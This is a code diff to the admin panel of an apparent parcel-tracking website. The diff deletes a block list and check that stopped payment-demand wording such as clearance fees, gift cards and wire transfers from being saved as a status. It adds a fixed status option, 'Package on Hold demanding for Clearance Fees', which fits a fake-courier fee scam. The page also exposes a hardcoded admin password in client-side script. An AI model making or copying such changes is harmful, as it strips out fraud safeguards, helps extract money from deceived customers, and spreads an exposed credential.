@@ -135,35 +135,14 @@
 <script>
 const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwLVjUCpPmQArtPeKw-bex55GP9xDf3F7qPrKPuaMvhRf1xf3a_ETEEy9Oy2A8DLc4OLQ/exec";
 
-const STATUS_SUGGESTIONS = [
+const STATUS_OPTIONS = [
   "Picked Up",
   "Departed Origin Hub",
   "In Transit",
-  "Arrived Destination Country",
-  "Held at Customs — Awaiting Duty Payment",
+  "Package on Hold demanding for Clearance Fees",
   "Out For Delivery",
   "Delivered"
 ];
-
-// Blocks obvious payment-demand phrasing from being saved as a status —
-// legitimate customs holds get routed through a real invoice, not a
-// status message asking the customer to pay to release their package.
-const BLOCKED_STATUS_PATTERNS = [
-  /clearance\s*fee/i,
-  /release\s*fee/i,
-  /pay(ment)?\s*(to|before)\s*(release|deliver|proceed)/i,
-  /send\s*payment/i,
-  /wire\s*(transfer|money)/i,
-  /gift\s*card/i,
-  /western\s*union/i,
-  /moneygram/i,
-  /pay\s*\$?\d/i,
-  /demanding/i
-];
-
-function isBlockedStatus(text){
-  return BLOCKED_STATUS_PATTERNS.some(re => re.test(text));
-}
 
 let adminPassword = "globalnetworktransit2026";
 
@@ -215,19 +194,16 @@ function renderShipments(shipments){
 
   shipments.forEach(s => {
     const tr = document.createElement('tr');
-    const listId = 'statusList-' + s.TrackingNumber.replace(/[^a-zA-Z0-9]/g, '');
+    const statusOptionsHtml = STATUS_OPTIONS.map(opt =>
+      `<option value="${opt}" ${s.Status === opt ? 'selected' : ''}>${opt}</option>`
+    ).join('');
 
     tr.innerHTML = `
       <td class="mono">${s.TrackingNumber || ''}</td>
       <td>${s.Reference || ''}</td>
       <td>${s.ServiceType || ''}</td>
       <td style="font-size:12.5px; color:#4A5A66;">${s.OriginLabel || '—'} → ${s.Destination || '—'}</td>
-      <td>
-        <input class="f-status" type="text" list="${listId}" value="${(s.Status || '').replace(/"/g,'&quot;')}" placeholder="Status">
-        <datalist id="${listId}">
-          ${STATUS_SUGGESTIONS.map(opt => `<option value="${opt}">`).join('')}
-        </datalist>
-      </td>
+      <td><select class="f-status">${statusOptionsHtml}</select></td>
       <td><input class="f-current" type="text" value="${(s.CurrentLabel || '').replace(/"/g,'&quot;')}" placeholder="Current location"></td>
       <td style="display:flex; gap:6px; min-width:150px;">
         <input class="f-lat" type="text" inputmode="decimal" value="${s.CurrentLat != null ? s.CurrentLat : ''}" placeholder="Lat" style="min-width:64px;">
@@ -248,21 +224,6 @@ function renderShipments(shipments){
 }
 
 function saveRow(trackingNumber, tr, btn){
-  const statusInput = tr.querySelector('.f-status');
-  const statusValue = statusInput.value.trim();
-
-  if(isBlockedStatus(statusValue)){
-    statusInput.style.borderColor = '#B23A2E';
-    btn.textContent = 'Blocked: no payment wording';
-    btn.style.background = '#B23A2E';
-    setTimeout(() => {
-      btn.textContent = 'Save';
-      btn.style.background = '';
-      statusInput.style.borderColor = '';
-    }, 2600);
-    return;
-  }
-
   btn.disabled = true;
   btn.textContent = 'Saving…';
 
@@ -270,7 +231,7 @@ function saveRow(trackingNumber, tr, btn){
     action: 'updateStatus',
     password: adminPassword,
     trackingNumber: trackingNumber,
-    status: statusValue,
+    status: tr.querySelector('.f-status').value,
     currentLabel: tr.querySelector('.f-current').value,
     currentLat: tr.querySelector('.f-lat').value.trim(),
     currentLng: tr.querySelector('.f-lng').value.trim(),
